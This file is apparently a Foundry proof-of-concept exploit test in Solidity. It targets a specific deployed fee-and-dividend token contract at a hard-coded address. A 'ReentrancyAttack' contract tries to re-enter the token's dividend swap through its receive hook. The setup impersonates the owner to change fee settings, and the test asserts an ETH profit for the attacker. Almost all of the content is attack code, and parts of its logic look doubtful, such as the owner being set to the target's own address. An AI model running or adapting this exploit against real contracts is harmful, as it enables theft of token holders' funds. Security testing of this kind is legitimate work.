pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IEthBurn {
    function swapAndSendDividends(uint256 tokens) external;
    function forceSwapAndSendDividends(uint256 tokens) external;
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function buyAmount() external view returns (uint256);
    function sellAmount() external view returns (uint256);
    function swapTokensAtAmount() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function setExcludeFees(address, bool) external;
    function setExcludeDividends(address) external;
    function setTrueDefiRouter(address) external;
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external payable;
    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract ReentrancyAttack {
    IEthBurn public target;
    bool private attacking;
    uint256 private reentrancyCount;
    uint256 private maxReentrancy = 3; // Limit to avoid out of gas

    constructor(address _target) {
        target = IEthBurn(_target);
    }

    receive() external payable {
        if (attacking && reentrancyCount < maxReentrancy) {
            reentrancyCount++;
            // Re-enter by transferring tokens again
            // This will trigger swapAndSendDividends again
            uint256 tokenBalance = target.balanceOf(address(this));
            if (tokenBalance > 0) {
                target.transfer(address(target), tokenBalance / 2);
            }
        }
    }

    function startAttack() external {
        attacking = true;
        reentrancyCount = 0;

        // Trigger initial transfer to start the process
        uint256 tokenBalance = target.balanceOf(address(this));
        require(tokenBalance > 0, "No tokens to transfer");

        // Transfer tokens to the contract itself to trigger fees
        // This should trigger swapAndSendDividends if conditions are met
        target.transfer(address(target), tokenBalance);

        attacking = false;
    }

    // Function to withdraw ETH
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4;
    address attacker = address(this);
    address constant owner = 0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4; // Contract is its own owner initially
    ReentrancyAttack public attackContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get some BURNING tokens and ensure contract has fees
        vm.startPrank(owner);
        // Get some tokens from owner (owner has all supply initially)
        IERC20(TARGET).transfer(attacker, 1000 * 10**18);
        vm.stopPrank();

        // Deploy malicious reentrancy contract
        attackContract = new ReentrancyAttack(TARGET);

        // Transfer some tokens to attack contract for triggering
        IERC20(TARGET).transfer(address(attackContract), 100 * 10**18);

        // Ensure trading is enabled (it should be after setTrueDefiRouter is called)
        // We need to impersonate owner to set up conditions
        vm.startPrank(owner);
        // Enable trading if not already enabled (call setTrueDefiRouter with some address)
        IEthBurn(TARGET).setTrueDefiRouter(address(0x123));
        // Exclude attack contract from fees to avoid issues
        IEthBurn(TARGET).setExcludeFees(address(attackContract), true);
        // Exclude from dividends
        IEthBurn(TARGET).setExcludeDividends(address(attackContract));
        vm.stopPrank();

        // Create some fees by making a buy/sell transaction
        // First, get some ETH for the attacker
        deal(attacker, 10 ether);

        // Approve tokens for uniswap pair
        address pair = IEthBurn(TARGET).uniswapV2Pair();
        IERC20(TARGET).approve(pair, type(uint256).max);

        // Add some liquidity to create initial pool
        vm.startPrank(owner);
        IERC20(TARGET).approve(address(IEthBurn(TARGET).uniswapV2Router()), type(uint256).max);
        IUniswapV2Router02 router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        router.addLiquidityETH{value: 1 ether}(TARGET, 1000 * 10**18, 0, 0, owner, block.timestamp);
        vm.stopPrank();

        // Make a small trade to generate fees
        vm.startPrank(attacker);
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = TARGET;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.1 ether}(0, path, attacker, block.timestamp);
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(attackContract).balance;

        // Trigger the attack - the attack contract will handle the reentrancy
        attackContract.startAttack();

        // Check if we gained ETH
        uint256 finalBalance = address(attackContract).balance;
        assertGt(finalBalance, initialBalance, "Attack should increase ETH balance");

        uint256 attackerFinalBalance = address(this).balance;
        assertGt(attackerFinalBalance, 0, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

